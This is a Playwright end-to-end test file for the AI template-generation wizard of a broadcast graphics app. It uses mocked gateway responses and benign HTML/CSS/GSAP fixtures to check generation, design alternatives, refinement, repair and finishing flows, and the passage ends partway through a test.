// covers: src/ai/**, src/components/wizard/steps/{AiStep.tsx,ai/**}, api/{ai/**,_lib/ai*{,/**}}
// covers: scripts/{aiDevPlugin.mjs,apiRouteTable.mjs}, src/components/feedback/**
// covers: src/components/wizard/**, !src/components/wizard/import/**
//
// The shared provider/model/key surface. The tier door is where its WORDING is pinned - the
// one defect class (a mislabelled tier, a transport offered as a choice) that builds green.
// covers: src/components/AiProviderSettings.tsx
//
// The feedback flow. Its OFFLINE contract is that no surface renders at all, which is the half this
// suite can check; the interactive half is e2e/configured/feedback.spec.ts and needs a configured
// backend. The button itself lives under src/components/feedback/, so the second covers line names
// it along with the contract and the client.
// covers: src/feedback/**
//
// The entitlement contract is what the render and AI paths gate on, so a change there can
// move behaviour in either - and in the admin surface that explains it.
// covers: src/entitlements/**

import { test, expect, type Page, type Route } from '@playwright/test';
import { chooseNoacgAgent } from './_ai-step';
import { awaitPreviewRebuild } from './_preview';
import { enableAdvancedMode } from './_create';
import { durableValue } from './_storage';

// AI mode (Create with AI): the normalized gateway endpoint is mocked at the network level, so these
// specs verify the full app flow — settings gate, generation, the harness's validation +
// runtime bench, the repair round, polish, refine, and create — without a real key or cost.

// The fixture passes the FULL harness bar: house-shaped (a {prefix}-box structure, :root
// vars, a readable NOACG_ANIM data block) and live-bench-clean (binds f0, plays, hides on
// stop, replays, survives doubled text).
const VALID_TEMPLATE = {
  name: 'Test Slate',
  type: 'info-card',
  summary: 'A minimal test slate with one name field.',
  html: `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Test Slate</title>
  <script src="js/gsap.min.js"></script>
  <link rel="stylesheet" href="css/template.css" />
  <script src="js/template.js"></script>
  <script>window.SPXGCTemplateDefinition = {
    "description": "Test Slate",
    "playserver": "OVERLAY", "playchannel": "1", "playlayer": "7",
    "webplayout": "7", "out": "manual", "dataformat": "json",
    "DataFields": [ { "field": "f0", "ftype": "textfield", "title": "Name", "value": "Hello AI" } ]
  };</script>
</head>
<body>
  <div class="slate">
    <div class="slate-box"><span id="f0">Hello AI</span></div>
  </div>
</body>
</html>`,
  css: `:root { --accent: #e8c547; --text-color: #ffffff; --text-dim: rgba(255,255,255,0.7); --panel-bg: rgba(12,14,18,0.92); --font-heading: sans-serif; --scale: 1; }
.slate { position: absolute; left: 80px; bottom: 80px; opacity: 0; }
.slate-box { color: var(--text-color); background: var(--panel-bg); padding: calc(20px * var(--scale)); width: fit-content; max-width: calc(900px * var(--scale)); overflow-wrap: break-word; }`,
  js: `function update(data) {
  var fields = (typeof data === 'string') ? JSON.parse(data) : data;
  for (var key in fields) { var el = document.getElementById(key); if (el) el.textContent = fields[key]; }
}
/* == ANIMATION (generated — the timeline edits the data block below) == */
var NOACG_ANIM = {
  "version": 1,
  "root": ".slate",
  "speed": 1,
  "steps": [
    { "name": "In", "duration": 0.5, "ease": "power2.out", "layers": { ".slate": { "opacity": [ { "time": 0, "value": 0 }, { "time": 0.5, "value": 1 } ] } } },
    { "name": "Out", "duration": 0.3, "ease": "power2.in", "layers": { ".slate": { "opacity": [ { "time": 0.3, "value": 0 } ] } } }
  ]
};
function buildInTimeline() { var tl = gsap.timeline(); tl.to('.slate', { opacity: 1, duration: 0.5, ease: 'power2.out' }); return tl; }
function buildOutTimeline() { var tl = gsap.timeline(); tl.to('.slate', { opacity: 0, duration: 0.3, ease: 'power2.in' }); return tl; }
/* == END ANIMATION == */
function play() { gsap.killTweensOf('*'); buildInTimeline(); }
function stop() { gsap.killTweensOf('*'); buildOutTimeline(); }
function next() {}`,
};

// Same template but with a broken runtime — the validator must reject it.
const INVALID_TEMPLATE = { ...VALID_TEMPLATE, js: 'var nothing = true;' };

// Design-stage fixtures: the harness's first call is emit_design_spec (the router).
// A 'custom' spec sends the flow to the free-form coder (the emit_template fixtures);
// a 'catalog' spec is assembled by the platform with NO further model calls.
const CUSTOM_SPEC = {
  fit: 'custom',
  reason: 'No catalog family carries this structure.',
  name: 'Test Slate',
  summary: 'A minimal test slate.',
  category: 'info-card',
  lines: [{ title: 'Name', sample: 'Hello AI' }],
};

const GROUNDED_SPEC = {
  fit: 'catalog',
  reason: 'A restrained lower third carries this brief.',
  name: 'Grounded Strap',
  summary: 'A clean lower third assembled from the catalog design system.',
  category: 'lower-third',
  variantId: 'lt01',
  lines: [
    { title: 'Name', sample: 'Ada Lovelace' },
    { title: 'Title', sample: 'Analyst' },
  ],
};

/** A plain text answer — what the brainstorm turn (no forced tool) gets back. */
function textReply(text: string) {
  return {
    status: 200,
    contentType: 'application/json',
    body: JSON.stringify({
      output: text,
      provider: 'anthropic',
      model: 'claude-sonnet-5',
      usage: { inputTokens: 20, outputTokens: 10, totalTokens: 30 },
      attempts: [{ route: { provider: 'anthropic', model: 'claude-sonnet-5' }, attempts: 1 }],
    }),
  };
}

/** A 1×1 PNG, enough to travel the whole attach path (data URL → vision block → asset). */
const PNG_1X1 = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVR4nGNgAAIAAAUAAXpeqz8AAAAASUVORK5CYII=',
  'base64',
);

/** The whole text of a request, for asserting what the model was actually told. */
function requestText(route: Route): string {
  const body = route.request().postDataJSON() as {
    request: { messages: { content: { type: string; text?: string }[] | string }[] };
  };
  return body.request.messages
    .map((m) => (Array.isArray(m.content) ? m.content.map((c) => c.text ?? '').join(' ') : m.content))
    .join(' ');
}

function toolUse(_name: string, input: unknown) {
  return {
    status: 200,
    contentType: 'application/json',
    body: JSON.stringify({
      output: input,
      provider: 'anthropic',
      model: 'claude-sonnet-5',
      // The real Messages API returns this block and telemetry records it. Without it the
      // fixture would exercise the no-usage path on every test by accident.
      usage: { inputTokens: 4200, outputTokens: 1100, totalTokens: 5300 },
      attempts: [{ route: { provider: 'anthropic', model: 'claude-sonnet-5' }, attempts: 1 }],
    }),
  };
}

/** Which forced tool the request asked for — the mock dispatches on it. */
function requestedTool(route: Route): string {
  const body = route.request().postDataJSON() as {
    surface?: string;
    request?: { structuredOutput?: { name?: string } };
  };
  // The other half of the surface-tag contract (e2e/_video.ts asserts the video half): SPX
  // generation is the GENERAL harness and must send no surface, because a surface is only for
  // a product area with a feature key of its own. Tagging SPX traffic 'video' would make the
  // ai.video kill switch stop graphics generation - so pin the absence, not just the presence.
  expect(body.surface, 'an SPX harness call must reach the gateway untagged').toBeUndefined();
  return body.request?.structuredOutput?.name ?? '';
}

function toolResponse(route: Route, template: unknown) {
  const tool = requestedTool(route);
  if (tool === 'emit_design_alternatives') return toolUse(tool, { alternatives: [CUSTOM_SPEC] });
  if (tool === 'emit_design_spec') return toolUse(tool, CUSTOM_SPEC);
  return toolUse('emit_template', template);
}

// Every generation here runs the REAL quality gate: static validation plus a live runtime
// bench per result - and the bench spends genuine wall-clock (font readiness, settle waits,
// the doubled-text stress pass). One result costs ~2 s; the alternatives path benches three
// of them serially and lands at 5.5-7.5 s on an idle box, more under four parallel workers.
// The suite's default 7 s expect budget therefore has no margin at all, which showed up as
// whichever generation test lost the CPU race failing with "element(s) not found". These
// waits get an explicit, honest budget instead - needing longer than this IS a real bug.
const GENERATED = { timeout: 25_000 };

/** Press the Entry card and stop on the step's arrival state: the coding-agent route alone. */
async function arriveOnAiStep(page: Page) {
  await page.goto('/app');
  await expect(page.locator('.wz-modal')).toBeVisible();
  await page.locator('[data-entry="ai"]').click();
  await expect(page.getByTestId('ai-agent-route')).toBeVisible();
}

async function openAiStep(page: Page) {
  await arriveOnAiStep(page);
  await chooseNoacgAgent(page);
}

/**
 * Create with AI now ends on the shared FINISH step, like every other mode: a valid result
 * enables Next, and the editor door lives there. This walks that flow and takes the editor
 * door (the classic ending — the name reaches the topbar, nothing is saved yet).
 */
async function finishInEditor(page: Page): Promise<void> {
  await page.getByRole('button', { name: 'Next →' }).click();
  await page.getByTestId('wz-finish-editor').click();
}

/** The tag of a test that never walks into an editor, so the Advanced opt-in below is not its. */
const NO_EDITOR = '@no-editor';

test.beforeEach(async ({ page }, testInfo) => {
  // A generation plus its benches, then a project create with a preview rebuild, sits at
  // 10-15 s per test and was observed over 30 s under worker contention - the suite-wide
  // 30 s cap is the wrong ceiling for this file.
  test.setTimeout(60_000);
  // Non-secret provider availability makes aiConfigured() true (the route below answers).
  // The harness is ON by default; specs that want it set it explicitly anyway so intent is
  // legible and a default flip can't silently change what a test exercises.
  await page.addInitScript(() =>
    localStorage.setItem('spx-gfx-ai', JSON.stringify({ provider: 'anthropic', configuredProviders: ['anthropic'], model: 'claude-sonnet-5', useHarness: true })),
  );
  // These specs finish through the Finish step's EDITOR door, which has been Advanced-only
  // since step 6 (docs/GOALS_ARCHIVE.md "Student release"; FinishStep `showEditorDoor`) - the same
  // opt-in every other editor-walking spec makes. That opt-in now SKIPS the test (e2e/_create.ts,
  // the old editor is closed), so a test that never reaches an editor is tagged NO_EDITOR and
  // stays out of it - otherwise it would be skipped along with the rest and prove nothing.
  if (testInfo.tags.includes(NO_EDITOR)) return;
  await enableAdvancedMode(page);
});

test('harness off (the toggle): one raw model call, no design stage', async ({ page }) => {
  await page.addInitScript(() =>
    localStorage.setItem('spx-gfx-ai', JSON.stringify({ provider: 'anthropic', configuredProviders: ['anthropic'], model: 'claude-sonnet-5', useHarness: false })),
  );
  const tools: string[] = [];
  await page.route('/api/ai/generate', (route: Route) => {
    tools.push(requestedTool(route));
    return route.fulfill(toolUse('emit_template', VALID_TEMPLATE));
  });
  await openAiStep(page);
  await expect(page.getByLabel(/Design 3 options/)).not.toBeChecked();
  await page.locator('.wz-step textarea').fill('A simple test slate');
  await page.getByRole('button', { name: 'Create', exact: true }).click();
  await expect(page.locator('.wz-step .status-ok')).toContainText('Passes validation', GENERATED);
  expect(tools).toEqual(['emit_template']); // one call, straight to the coder tool
  await finishInEditor(page);
  await expect(page.locator('.topbar .tpl-name')).toHaveText('Test Slate');
});

const NOACG_WARNING = "The NoaCG agent's results are not yet proven to be consistently good.";

test('the step opens on the coding-agent route alone; the NoaCG agent is one click away, with its warning', { tag: NO_EDITOR }, async ({ page }) => {
  // Owner, 2026-09-28: the step carried too much information. On arrival the user's own coding
  // agent is the first and ONLY primary content; the one other thing is a secondary button into
  // the NoaCG agent with a plain warning under it (wizard/open-create-step-user-own-coding).
  await page.setViewportSize({ width: 1366, height: 768 });
  await arriveOnAiStep(page);
  const step = page.locator('.wz-step');
  const choose = page.getByTestId('ai-noacg-choose');
  const warning = page.getByTestId('ai-noacg-warning');
  await expect(choose).toHaveText('No, I want to try the NoaCG agent');
  await expect(warning).toHaveText(NOACG_WARNING);
  // Secondary, not the step's primary: the card is what the eye should land on.
  await expect(choose).not.toHaveClass(/primary/);
  // Both fit the budget laptop without a scroll, or the choice is hidden below the fold.
  await expect(choose).toBeInViewport();
  await expect(warning).toBeInViewport();
  // A plain warning in BODY text, not a muted hint: it reads in the same colour as the card title.
  const colours = await page.evaluate(() => ({
    warning: getComputedStyle(document.querySelector('[data-testid="ai-noacg-warning"]')!).color,
    title: getComputedStyle(document.querySelector('.ai-agent-route-title')!).color,
  }));
  expect(colours.warning).toBe(colours.title);

  // NOTHING ELSE COMPETES before the choice: none of the generator's surfaces is in the DOM.
  for (const selector of [
    '[data-testid="ai-builtin"]', '.wz-drop', '.wz-step textarea', '[data-testid="ai-format-resolution"]',
    '[data-testid="ai-settings"]', '[data-testid="more-control-toggle"]', '.wz-sec-head',
  ]) {
    await expect(page.locator(selector), `${selector} shows before the choice`).toHaveCount(0);
  }
  // And no caveat of the old kind anywhere on the step: no Beta, no testing note, no tag.
  await expect(step).not.toContainText(/Beta|in testing|testing phase|Recommended/i);

  // ONE CLICK: the section opens with its head carrying the same warning, and focus moves to it
  // rather than falling to the body when the button it replaced unmounts.
  await choose.click();
  const section = page.getByTestId('ai-builtin');
  await expect(section).toBeFocused();
  await expect(page.getByTestId('ai-noacg-door')).toHaveCount(0);
  const head = section.locator('.wz-sec-head');
  await expect(head).toContainText('NoaCG agent');
  await expect(head).toContainText(NOACG_WARNING);
  // AND IT IS READ, NOT CLIPPED. `.wz-sec-head .muted` is one nowrap line with an ellipsis
  // elsewhere; this longer line must wrap instead of showing "…not yet prov…". Measure it.
  const clipped = await head.locator('.muted').evaluate((el) => el.scrollWidth - el.clientWidth);
  expect(clipped, 'the warning is cut off by the section head').toBeLessThanOrEqual(1);
  // The ⓘ says what the NoaCG agent does, with no testing-phase language.
  await page.getByTestId('ai-noacg-why').click();
  const why = page.getByTestId('ai-noacg-why-body');
  await expect(why).toContainText('validated and exercised in a live playout test');
  await expect(why).toContainText('start from a template or import your own artwork');
  await expect(why).not.toContainText(/testing phase/);
  // Every generator surface is back.
  await expect(page.locator('.wz-drop')).toBeVisible();
  await expect(page.locator('.wz-step textarea')).toBeVisible();
  await expect(page.getByTestId('ai-format-resolution')).toBeVisible();
  await expect(page.getByTestId('more-control-toggle')).toBeVisible();
  await expect(page.getByRole('button', { name: /AI settings/ })).toBeVisible();

  // The choice is not stored: leaving the step and opening it again shows the agent route first.
  await page.getByRole('button', { name: '← Back' }).click();
  await page.locator('[data-entry="ai"]').click();
  await expect(page.getByTestId('ai-noacg-choose')).toBeVisible();
  await expect(page.getByTestId('ai-builtin')).toHaveCount(0);
});

test('a template dropped before the choice opens the NoaCG agent with the file on its import card', { tag: NO_EDITOR }, async ({ page }) => {
  // The no-AI "open as code" import lives behind the NoaCG agent's drop zone, and somebody
  // holding an .html should not have to know that: a drop anywhere on the step before the
  // choice opens the section with the file already in it.
  await arriveOnAiStep(page);
  const dataTransfer = await page.evaluateHandle((html) => {
    const dt = new DataTransfer();
    dt.items.add(new File([html], 'test-slate.html', { type: 'text/html' }));
    return dt;
  }, VALID_TEMPLATE.html);
  const card = page.getByTestId('ai-agent-route');
  await card.dispatchEvent('dragover', { dataTransfer });
  await card.dispatchEvent('drop', { dataTransfer });
  await expect(page.getByTestId('ai-builtin')).toBeVisible();
  await expect(page.getByTestId('import-format-detection')).toBeVisible();
  await expect(page.getByRole('button', { name: /Open as code \(no AI\)/ })).toBeVisible();
});

test('the harness checkbox is on by default', async ({ page }) => {
  // Saved settings WITHOUT a useHarness key — the default must resolve to on.
  await page.addInitScript(() =>
    localStorage.setItem('spx-gfx-ai', JSON.stringify({ provider: 'anthropic', configuredProviders: ['anthropic'], model: 'claude-sonnet-5' })),
  );
  await openAiStep(page);
  await expect(page.getByLabel(/Design 3 options/)).toBeChecked();
});

test('describe-it: prompt → validated template → create project', async ({ page }) => {
  await page.route('/api/ai/generate', (route: Route) => route.fulfill(toolResponse(route, VALID_TEMPLATE)));
  await openAiStep(page);
  await page.locator('.wz-step textarea').fill('A simple test slate');
  await page.getByRole('button', { name: 'Create', exact: true }).click();
  await expect(page.locator('.wz-step .status-ok')).toContainText('Passes validation', GENERATED);
  // The result renders live in the wizard preview.
  await expect(page.locator('.wz-side iframe')).toBeVisible();
  await awaitPreviewRebuild(page, async () => {
    await finishInEditor(page);
    await expect(page.locator('.wz-modal')).toBeHidden();
    await expect(page.locator('.topbar .tpl-name')).toHaveText('Test Slate');
  });
  await expect(page.frameLocator('iframe.preview-frame').locator('#f0')).toHaveText('Hello AI');
});

test('finish: Create with AI reaches the shared Finish step, gated on a valid result', async ({ page }) => {
  await page.addInitScript(() =>
    localStorage.setItem('spx-gfx-ai', JSON.stringify({ provider: 'anthropic', configuredProviders: ['anthropic'], model: 'claude-sonnet-5', useHarness: false })),
  );
  await page.route('/api/ai/generate', (route: Route) => route.fulfill(toolResponse(route, VALID_TEMPLATE)));
  await openAiStep(page);
  // Before a result exists there is nothing to finish — the branch gate is shut.
  await expect(page.getByRole('button', { name: 'Next →' })).toBeDisabled();

  await page.locator('.wz-step textarea').fill('A simple test slate');
  await page.getByRole('button', { name: 'Create', exact: true }).click();
  await expect(page.locator('.wz-step .status-ok')).toContainText('Passes validation', GENERATED);

  // A valid result opens the gate; Next lands on the same Finish step every catalog mode ends on.
  await page.getByRole('button', { name: 'Next →' }).click();
  await expect(page.locator('.wz-dot').last()).toHaveText(/Finish/);
  await expect(page.getByTestId('wz-finish-editor')).toBeVisible();
  await expect(page.getByTestId('wz-finish-export')).toBeVisible();
  // The name defaults to the generated design, and the read-back is taken off the result itself.
  await expect(page.getByTestId('wz-finish-name')).toHaveAttribute('placeholder', 'Test Slate');
  await expect(page.locator('.wz-finish-summary')).toContainText('Test Slate');

  // Back returns to the Create step with the result — and its whole thread — intact (AiStep is
  // kept mounted across the move, so nothing lifted-out is lost).
  await page.getByRole('button', { name: '← Back' }).click();
  await expect(page.locator('.change-preview strong')).toHaveText('Test Slate');
});

test('finish: the Create-with-AI export door saves the graphic and opens the export window', async ({ page }) => {
  await page.addInitScript(() =>
    localStorage.setItem('spx-gfx-ai', JSON.stringify({ provider: 'anthropic', configuredProviders: ['anthropic'], model: 'claude-sonnet-5', useHarness: false })),
  );
  await page.route('/api/ai/generate', (route: Route) => route.fulfill(toolResponse(route, VALID_TEMPLATE)));
  await openAiStep(page);
  await page.locator('.wz-step textarea').fill('A simple test slate');
  await page.getByRole('button', { name: 'Create', exact: true }).click();
  await expect(page.locator('.wz-step .status-ok')).toContainText('Passes validation', GENERATED);

  await page.getByRole('button', { name: 'Next →' }).click();
  await page.getByTestId('wz-finish-name').fill('Election Night Slate');
  await page.getByTestId('wz-finish-export').click();

  // The export door is the same shape as every other mode: save, then open the export window
  // OVER the wizard (closing it returns to the last creation step) — the editor is never
  // revealed. Same contract wizard-finish.spec.ts pins since the dashboard redesign.
  const win = page.getByTestId('export-window');
  await expect(win).toBeVisible();
  await expect(page.getByTestId('creation-wizard')).toBeVisible();
  await expect(win.locator('h2')).toContainText('Election Night Slate');
  await expect(win.locator('input[name="export-target"]')).toHaveCount(6);

  // The AI creation survives the session under the chosen name — an export-only run that
  // vanished would cost the whole generation to reproduce.
  const names = await page.evaluate(async () => {
    const { loadGraphics } = await import('/src/model/library.ts');
    return loadGraphics().map((g) => g.name);
  });
  expect(names).toEqual(['Election Night Slate']);
});

test('harness on: three grounded alternatives, zero coder calls, the pick is remembered', async ({ page }) => {
  let templateCalls = 0;
  const alts = [
    { ...GROUNDED_SPEC, variantId: 'lt01', name: 'Grounded One' },
    { ...GROUNDED_SPEC, variantId: 'lt02', name: 'Grounded Two' },
    { ...GROUNDED_SPEC, variantId: 'lt03', name: 'Grounded Three' },
  ];
  await page.route('/api/ai/generate', (route: Route) => {
    const tool = requestedTool(route);
    if (tool === 'emit_template') templateCalls += 1;
    if (tool === 'emit_design_alternatives') return route.fulfill(toolUse(tool, { alternatives: alts }));
    return route.fulfill(toolUse('emit_template', VALID_TEMPLATE));
  });
  await openAiStep(page);
  await page.locator('.wz-step textarea').fill('A clean news lower third');
  await page.getByRole('button', { name: 'Create', exact: true }).click();
  await expect(page.locator('.wz-step .status-ok')).toContainText('Passes validation', GENERATED);
  expect(templateCalls).toBe(0); // grounded: the platform assembled all three, the model wrote no code
  await expect(page.locator('[data-alt]')).toHaveCount(3);

  // Pick option 2 — the preview and result card follow.
  await page.locator('[data-alt="2"]').click();
  await expect(page.locator('.change-preview strong')).toHaveText('Grounded Two');
  await finishInEditor(page);
  await expect(page.locator('.wz-modal')).toBeHidden();
  await expect(page.locator('.topbar .tpl-name')).toHaveText('Grounded Two');

  // The committed pick landed in the aggregated preference data (chosen 1 of 3 shown).
  const prefs = await page.evaluate(() => JSON.parse(localStorage.getItem('spx-gfx-ai-preferences') ?? '{}'));
  expect((prefs as { selections: number }).selections).toBe(1);
  expect((prefs as { chosen: Record<string, number> }).chosen['variantId:lt02']).toBe(1);
  expect((prefs as { shown: Record<string, number> }).shown['variantId:lt03']).toBe(1);
});

// The three directions differ in real design decisions, so the picker has to SHOW them.
const THREE_ALTS = [
  { ...GROUNDED_SPEC, variantId: 'lt01', name: 'Grounded One', density: 'airy' },
  { ...GROUNDED_SPEC, variantId: 'lt02', name: 'Grounded Two', density: 'compact' },
  { ...GROUNDED_SPEC, variantId: 'lt03', name: 'Grounded Three', density: 'standard' },
];

test('harness on: the directions are live previews that name their design decisions', async ({ page }) => {
  await page.route('/api/ai/generate', (route: Route) => {
    if (requestedTool(route) === 'emit_design_alternatives')
      return route.fulfill(toolUse('emit_design_alternatives', { alternatives: THREE_ALTS }));
    return route.fulfill(toolUse('emit_template', VALID_TEMPLATE));
  });
  await openAiStep(page);
  await page.locator('.wz-step textarea').fill('A clean news lower third');
  await page.getByRole('button', { name: 'Create', exact: true }).click();
  await expect(page.locator('[data-alt]')).toHaveCount(3, GENERATED);
  // Each card renders the REAL graphic — the whole point of the alternatives call.
  await expect(page.locator('[data-alt] .wz-mini iframe')).toHaveCount(3);
  // …and says what makes it different from the other two.
  await expect(page.locator('[data-alt="1"]')).toContainText('airy');
  await expect(page.locator('[data-alt="2"]')).toContainText('compact');
});

// A well-formed intent answer for these briefs: a catalog family carries a lower third,
// confidently, with no originality demand - the auto route must decide adapt.
const CATALOG_INTENT = {
  kind: 'family',
  families: ['strap'],
  confidence: 'high',
  summary: 'A lower third strap.',
  parts: [{ id: 'panel', role: 'content' }],
  fields: [],
  originalityRequested: false,
};

test('harness on: the intent stage runs first, and a catalog fit routes to adapt', async ({ page }) => {
  const tools: string[] = [];
  await page.route('/api/ai/generate', (route: Route) => {
    const tool = requestedTool(route);
    tools.push(tool);
    if (tool === 'emit_structural_intent') return route.fulfill(toolUse(tool, CATALOG_INTENT));
    if (tool === 'emit_design_alternatives')
      return route.fulfill(toolUse(tool, { alternatives: THREE_ALTS }));
    return route.fulfill(toolUse('emit_template', VALID_TEMPLATE));
  });
  await openAiStep(page);
  await page.locator('.wz-step textarea').fill('A clean news lower third');
  await page.getByRole('button', { name: 'Create', exact: true }).click();
  await expect(page.locator('[data-alt]')).toHaveCount(3, GENERATED);
  // Intent first, then the one design call - and an adapt decision sends nothing to the coder.
  expect(tools).toEqual(['emit_structural_intent', 'emit_design_alternatives']);
  await expect(page.locator('.change-preview strong')).toHaveText('Grounded One');
});

test('harness on: an intent answer from the wrong tool routes nothing - the flow falls back whole', async ({ page }) => {
  // The mutation twin of the adapt test above, and a real production hazard: the forced
  // intent call answered with emit_template's payload. Normalizing that garbage would read
  // as a low-confidence 'novel' and route every catalog brief to the coder at triple cost;
  // the stage must instead fail honestly and fall back to the pre-routing flow.
  let templateCalls = 0;
  await page.route('/api/ai/generate', (route: Route) => {
    const tool = requestedTool(route);
    if (tool === 'emit_template') templateCalls += 1;
    if (tool === 'emit_structural_intent') return route.fulfill(toolUse(tool, VALID_TEMPLATE));
    if (tool === 'emit_design_alternatives')
      return route.fulfill(toolUse(tool, { alternatives: THREE_ALTS }));
    return route.fulfill(toolUse('emit_template', VALID_TEMPLATE));
  });
  await openAiStep(page);
  await page.locator('.wz-step textarea').fill('A clean news lower third');
  await page.getByRole('button', { name: 'Create', exact: true }).click();
  await expect(page.locator('[data-alt]')).toHaveCount(3, GENERATED);
  expect(templateCalls).toBe(0); // grounded assembly, not a forced-create coder run
  await expect(page.locator('.change-preview strong')).toHaveText('Grounded One');
});

test('harness on: refining a direction keeps the others, and the pick still trains preferences', async ({ page }) => {
  await page.route('/api/ai/generate', (route: Route) => {
    const tool = requestedTool(route);
    if (tool === 'emit_design_alternatives')
      return route.fulfill(toolUse(tool, { alternatives: THREE_ALTS }));
    // A grounded refine goes back through the DESIGN stage (spec-level), not the coder.
    if (tool === 'emit_design_spec')
      return route.fulfill(toolUse(tool, { ...GROUNDED_SPEC, variantId: 'lt02', name: 'Grounded Two Warmer' }));
    return route.fulfill(toolUse('emit_template', VALID_TEMPLATE));
  });
  await openAiStep(page);
  await page.locator('.wz-step textarea').fill('A clean news lower third');
  await page.getByRole('button', { name: 'Create', exact: true }).click();
  await expect(page.locator('[data-alt]')).toHaveCount(3, GENERATED);

  await page.locator('[data-alt="2"]').click();
  await expect(page.locator('.change-preview strong')).toHaveText('Grounded Two');
  await page.getByPlaceholder(/Refine it/).fill('warmer colours');
  await page.getByRole('button', { name: 'Refine', exact: true }).click();
  await expect(page.locator('.change-preview strong')).toHaveText('Grounded Two Warmer', GENERATED);

  // The other two directions were NOT thrown away by the refinement.
  await expect(page.locator('[data-alt]')).toHaveCount(3);
  await expect(page.locator('[data-alt="1"]')).toContainText('Grounded One');
  await expect(page.locator('[data-alt="3"]')).toContainText('Grounded Three');

  await finishInEditor(page);
  await expect(page.locator('.topbar .tpl-name')).toHaveText('Grounded Two Warmer');
  // Refining used to CLEAR the staged pick, so a user who improved a direction before
  // creating it trained the preference data with nothing at all.
  const prefs = await page.evaluate(() => JSON.parse(localStorage.getItem('spx-gfx-ai-preferences') ?? '{}'));
  expect((prefs as { selections: number }).selections).toBe(1);
  expect((prefs as { chosen: Record<string, number> }).chosen['variantId:lt02']).toBe(1);
  expect((prefs as { shown: Record<string, number> }).shown['variantId:lt01']).toBe(1);
});

test('harness on: a refinement can be undone back to the design that was proposed', async ({ page }) => {
  await page.route('/api/ai/generate', (route: Route) => {
    const tool = requestedTool(route);
    if (tool === 'emit_design_alternatives')
      return route.fulfill(toolUse(tool, { alternatives: THREE_ALTS }));
    if (tool === 'emit_design_spec')
      return route.fulfill(toolUse(tool, { ...GROUNDED_SPEC, variantId: 'lt02', name: 'Grounded Two Warmer' }));
    return route.fulfill(toolUse('emit_template', VALID_TEMPLATE));
  });
  await openAiStep(page);
  await page.locator('.wz-step textarea').fill('A clean news lower third');
  await page.getByRole('button', { name: 'Create', exact: true }).click();
  await expect(page.locator('[data-alt]')).toHaveCount(3, GENERATED);
  await page.locator('[data-alt="2"]').click();
  await expect(page.getByTestId('ai-revert')).toHaveCount(0); // nothing to undo yet

  await page.getByPlaceholder(/Refine it/).fill('warmer colours');
  await page.getByRole('button', { name: 'Refine', exact: true }).click();
  await expect(page.locator('.change-preview strong')).toHaveText('Grounded Two Warmer', GENERATED);
  await page.getByTestId('ai-revert').click();
  await expect(page.locator('.change-preview strong')).toHaveText('Grounded Two');
  await expect(page.getByTestId('ai-revert')).toHaveCount(0);
});

test('a failing result offers one press that sends the findings back', async ({ page }) => {
  // The coder's own repair rounds are exhausted (MAX_REPAIR_ROUNDS = 2), so the result is
  // surfaced still failing — that is the moment the user is left holding raw findings.
  let templateCalls = 0;
  await page.route('/api/ai/generate', (route: Route) => {
    if (requestedTool(route) !== 'emit_template') return route.fulfill(toolResponse(route, VALID_TEMPLATE));
    templateCalls += 1;
    return route.fulfill(toolUse('emit_template', templateCalls <= 3 ? INVALID_TEMPLATE : VALID_TEMPLATE));
  });
  await openAiStep(page);
  await page.locator('.wz-step textarea').fill('A slate the coder cannot get right');
  await page.getByRole('button', { name: 'Create', exact: true }).click();
  await expect(page.locator('.wz-step .status-bad')).toContainText('check(s) failing', GENERATED);
  await page.getByTestId('ai-fix').click();
  await expect(page.locator('.wz-step .status-ok')).toContainText('Passes validation', GENERATED);
  await expect(page.getByTestId('ai-fix')).toHaveCount(0);
});

test('an example brief never silently replaces a brief you wrote', async ({ page }) => {
  await openAiStep(page);
  const box = page.locator('.wz-step textarea');
  // Nothing to lose: one click fills the box.
  await page.getByRole('button', { name: 'Election results' }).click();
  await expect(box).toHaveValue(/Election results panel/);

  // Now the brief is the user's own — the same click has to ask first.
  await box.fill('my own carefully written brief');
  await page.getByRole('button', { name: 'Weather now' }).click();
  await expect(box).toHaveValue('my own carefully written brief');
  await page.getByRole('button', { name: 'Replace your brief?' }).click();
  await expect(box).toHaveValue(/weather now/i);
});

test('the conversation is one thread, and it travels with the brief', async ({ page }) => {
  let designText = '';
  await page.route('/api/ai/generate', (route: Route) => {
    const tool = requestedTool(route);
    if (!tool)
      return route.fulfill(
        textReply('A substitutions strap wants the player names side by side.\nBRIEF: A football substitution strap with both player names.'),
      );
    if (tool === 'emit_design_alternatives') {
      designText = requestText(route);
      return route.fulfill(toolUse(tool, { alternatives: THREE_ALTS }));
    }
    return route.fulfill(toolUse('emit_template', VALID_TEMPLATE));
  });
  await openAiStep(page);
  await page.locator('.wz-step textarea').fill('halftime of a local derby, something for substitutions');
  await page.getByTestId('ai-talk').click();
  // Both sides of the exchange land in the ONE transcript.
  await expect(page.getByTestId('ai-thread')).toContainText('halftime of a local derby');
  await expect(page.getByTestId('ai-thread')).toContainText('side by side');
  // The box is empty, but the talk arrived at a brief — Generate acts on it.
  await expect(page.locator('.wz-step textarea')).toHaveValue('');
  await page.getByRole('button', { name: 'Create', exact: true }).click();
  await expect(page.locator('[data-alt]')).toHaveCount(3, GENERATED);
  // The generator was told the whole conversation, not just a copied summary line.
  expect(designText).toContain('halftime of a local derby');
  expect(designText).toContain('side by side');
});

test('an earlier generation stays in the thread and can be brought back', async ({ page }) => {
  let round = 0;
  await page.route('/api/ai/generate', (route: Route) => {
    const tool = requestedTool(route);
    if (tool === 'emit_design_alternatives') {
      round += 1;
      const suffix = round === 1 ? 'One' : 'Two';
      return route.fulfill(
        toolUse(tool, {
          alternatives: THREE_ALTS.map((a, i) => ({ ...a, name: `Round ${suffix} ${i + 1}` })),
        }),
      );
    }
    return route.fulfill(toolUse('emit_template', VALID_TEMPLATE));
  });
  await openAiStep(page);
  await page.locator('.wz-step textarea').fill('A clean news lower third');
  await page.getByRole('button', { name: 'Create', exact: true }).click();
  await expect(page.locator('.change-preview strong')).toHaveText('Round One 1', GENERATED);

  await page.locator('.wz-step textarea').fill('Actually try something bolder');
  await page.getByRole('button', { name: '↻ Start over' }).click();
  await expect(page.locator('.change-preview strong')).toHaveText('Round Two 1', GENERATED);
  // The first round was not thrown away — it is in the thread, with its three thumbnails.
  await expect(page.getByTestId('ai-past')).toHaveCount(1);
  await expect(page.getByTestId('ai-past').locator('.wz-mini iframe')).toHaveCount(3);

  await page.getByRole('button', { name: '↩ Bring back' }).click();
